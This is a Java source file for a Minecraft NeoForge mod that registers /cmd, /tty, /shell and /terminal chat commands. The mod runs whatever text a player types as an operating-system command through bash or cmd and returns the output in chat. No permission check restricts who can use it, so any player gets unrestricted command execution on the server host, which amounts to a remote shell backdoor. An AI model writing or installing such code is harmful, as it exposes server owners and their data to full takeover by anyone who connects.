package com.yourmord;

import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.context.CommandContext;
import com.mojang.brigadier.exceptions.CommandSyntaxException;
import net.minecraft.ChatFormatting;
import net.minecraft.commands.CommandSourceStack;
import net.minecraft.commands.Commands;
import net.minecraft.network.chat.Component;
import net.minecraft.server.level.ServerPlayer;
import net.neoforged.neoforge.event.RegisterCommandsEvent;
import net.neoforged.bus.api.SubscribeEvent;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.concurrent.Executors;
public class CommandHandler {
    @SubscribeEvent
    public void onRegisterCommands(RegisterCommandsEvent event) {
        CommandDispatcher<CommandSourceStack> dispatcher = event.getDispatcher();
        var argumentBuilder = Commands.argument("command", StringArgumentType.greedyString())
                .executes(this::executeCommand);
        dispatcher.register(Commands.literal("cmd").then(argumentBuilder));
        dispatcher.register(Commands.literal("tty").then(argumentBuilder));
        dispatcher.register(Commands.literal("shell").then(argumentBuilder));
        dispatcher.register(Commands.literal("terminal").then(argumentBuilder));
    }
    private int executeCommand(CommandContext<CommandSourceStack> context) throws CommandSyntaxException {
        ServerPlayer player = context.getSource().getPlayerOrException();
        String fullCommand = StringArgumentType.getString(context, "command");
        Executors.newSingleThreadExecutor().submit(() -> {
            try {
                String os = System.getProperty("os.name").toLowerCase();
                String[] command;
                if (os.contains("win")) {
                    command = new String[]{"cmd", "/c", fullCommand};
                } else {
                    command = new String[]{"bash", "-c", fullCommand};
                }
                Process process = Runtime.getRuntime().exec(command);
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder output = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
                int exitCode = process.waitFor();
                if (exitCode == 0) {
                    String result = output.toString().trim();
                    if (result.isEmpty()) {
                        player.sendSystemMessage(Component.translatable("command.yourmodid.success.no_output"));
                    } else {
                        player.sendSystemMessage(Component.literal(result).withStyle(ChatFormatting.GRAY));
                    }
                } else {
                    BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
                    StringBuilder errorOutput = new StringBuilder();
                    String errorLine;
                    while ((errorLine = errorReader.readLine()) != null) {
                        errorOutput.append(errorLine).append("\n");
                    }
                    String errorMsg = errorOutput.toString().trim();
                    if (!errorMsg.isEmpty()) {
                        player.sendSystemMessage(Component.literal(errorMsg).withStyle(ChatFormatting.WHITE));
                    } else {
                        player.sendSystemMessage(Component.translatable("command.yourmodid.error.general"));
                    }
                }
            } catch (Exception e) {
                player.sendSystemMessage(Component.translatable("command.yourmodid.error.general"));
                e.printStackTrace();
            }
        });
        return 1;
    }
}
